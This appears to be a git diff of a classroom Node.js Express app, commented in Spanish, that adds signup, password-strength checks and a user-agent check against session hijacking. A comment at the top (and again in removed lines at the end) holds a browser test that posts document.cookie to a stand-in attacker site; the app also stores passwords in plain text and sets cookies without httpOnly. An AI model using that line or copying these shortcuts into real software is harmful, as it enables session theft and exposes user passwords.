@@ -1,16 +1,59 @@
-const express = require('express');
-const crypto = require('crypto');
-const cookieParser = require('cookie-parser');
-const app = express();
-const port = 3000;
+//npm init -y
+//npm i express
+//npm i -D nodemon
+//npm run dev
+// npm i cookie-parser
 
-const sessions = {}
+
+
+//prueba en navegador
+//alert(docuemnt.cookie);
+//fetch('https://atackers.site/cookies/robbed',{method:'POST',body:docuemnt.cookie})
+
+const express = require("express");
+const crypto = require("crypto");
+const cookieParser = require("cookie-parser");
+const { CLIENT_RENEG_LIMIT } = require("tls");
+const app = express();
+const PORT = 3000;
+
+const users = [];
+const sessions = {};
+
+const isValidPassword = function(password){
+    // Longitud minima de 10 caracteres
+    if(password.length < 10){
+        return false;
+    }
+    // Contenga al menos una mayuscula
+    if(!/[A-Z]/.test(password)){
+        return false;
+    }
+    // Contener al menos una minuscula
+    if(!/[a-z]/.test(password)){
+        return false;
+    }
+    // Contener al menos un numero
+    if(!/[0-9]/.test(password)){
+        return false;
+    }
+    // Contener al menos un caracter especial
+    if(!/[^A-Za-z0-9]/.test(password)){
+        return false;
+    }
+    // Que un caracter no se repita mas de 3 veces consecutivas
+    if(/(.)\1{3,}/.test(password)){
+        return false;
+    }
+    return true;
+
+};
 
 const createSession = function(req, res){
     const userAgent = req.get('user-agent');
     const sessionId = crypto.randomBytes(16).toString('base64url');
     sessions[sessionId] = {userAgent};
-    res.cookie('sessionId', sessionId);
+    res.cookie("sessionId", sessionId);
     return sessionId;
 };
 
@@ -30,16 +73,16 @@ const getSessionData = function(req, res){
     }
     return sessionData;
 };
+const sessionsMiddleware = function(req, res, next){
+    const sessionData = getSessionData(req, res);
 
-
-const sessionMiddleware = function(req, res, next){
-   const sessionData = getSessionData(req, res);
-   if(!sessionData || !sessionData.username){
+    if(!sessionData || !sessionData.username){
         res.redirect(302, '/login');
         return;
-   }
-   req.userData = sessionData;
-   next();
+    }
+
+    req.userData = sessionData;
+    next();
 };
 
 const sessionHijackCheckMiddleware = function(req, res, next){
@@ -49,55 +92,74 @@ const sessionHijackCheckMiddleware = function(req, res, next){
     if(requestUserAgent != sessionUserAgent){
         const sessionId = getSessionId(req, res);
         delete sessions[sessionId];
-        console.log('SESION SECUESTRADA, detectado por User-Agent.');
+        console.log('SESSION SECUESTRADA, detectado por User-Agent.');
         createSession(req, res);
     }
     next();
 };
 
-
-app.use (cookieParser());
-app.use(express.urlencoded({extended: true}));
-
-
-app.get('/', (req, res)=>{
-    res.send('hola mundo');
+app.use(cookieParser());
+app.use(express.urlencoded({extended:true}));
+app.get("/", (req,res) => {
+    res.send("Hola mundo");
 });
 
-app.post('/login', (req, res)=>{
+app.post('/login', (req,res) => {
     console.log(req.body);
-    const{username} = req.body;
-    const sessionId = crypto.randomBytes(16).toString('base64url');
-    sessions[sessionId] = {username};
-    res.cookie('sessionId',sessionId);
-    res.redirect(302,'/home');
+    let {username, password} = req.body;
+
+    if(username.trim() == "" || password == ""){
+        res.send('Datos de acceso incorrectos.');
+        return;
+    }
+    username = username.toLowerCase();
+    const user = users.find(u => u.username == username);
+
+    if(!user){
+        res.send('Datos de acceso incorrectos.');
+        return;
+    }
+    if(user.password != password){
+        res.send('Datos de acceso incorrectos.')
+        return;
+    }
+
     
+    const sessionId = createSession(req, res);
+    sessions[sessionId]['username'] = username;
+    res.redirect(302, '/home');
+});
+app.get('/home', sessionHijackCheckMiddleware, sessionsMiddleware, (req, res)=>{
+    res.send(`Hola ${req.userData.username}`);
+})
+app.post('/signup', (req,res)=>{
+    let {username, password, password2} = req.body;
+    
+    if(password != password2){
+        res.send('Las contraseñas no coinciden');
+        return;
+    }
+    if(!isValidPassword(password)){
+        res.send('Las contraseña no cumple con caracteristicas de seguridad');
+        return;
+    }
+    username = username.toLowerCase();
+    const user = users.find(u => u.username == username);
+    if(user){
+        res.send("Nombre de usuario ya esta en uso");
+        return;
+    }
+    users.push({username, password});
+    res.redirect('/login');
 });
 
-app.use('/login', express.static('static/html/login.html'));
-app.get('/home', sessionHijackCheckMiddleware, sessionMiddleware, (req, res)=> {
- 
-     res.send(`Hola ${req.userData.username}`);
-});
+app.use('/signup', express.static("static/html/signup.html"));
+
+app.use(express.static('static'));
+app.use('/login', express.static("static/html/login.html"));
 
 
-
-
-
-
-app.listen(port, () =>{
-    console.log(`Listening on http://127.0.0.1:${port}`);
+app.listen(PORT, () =>{
+    console.log(`Listening on http://127.0.0.1:${PORT}`);
 
 })
-
-//npm init -y
-//npm i express
-//npm i -D nodemon
-//npm run dev
-// npm i cookie-parser
-
-
-
-//prueba en navegador
-//alert(docuemnt.cookie);
-//fetch('https://atackers.site/cookies/robbed',{method:'POST',body:docuemnt.cookie})
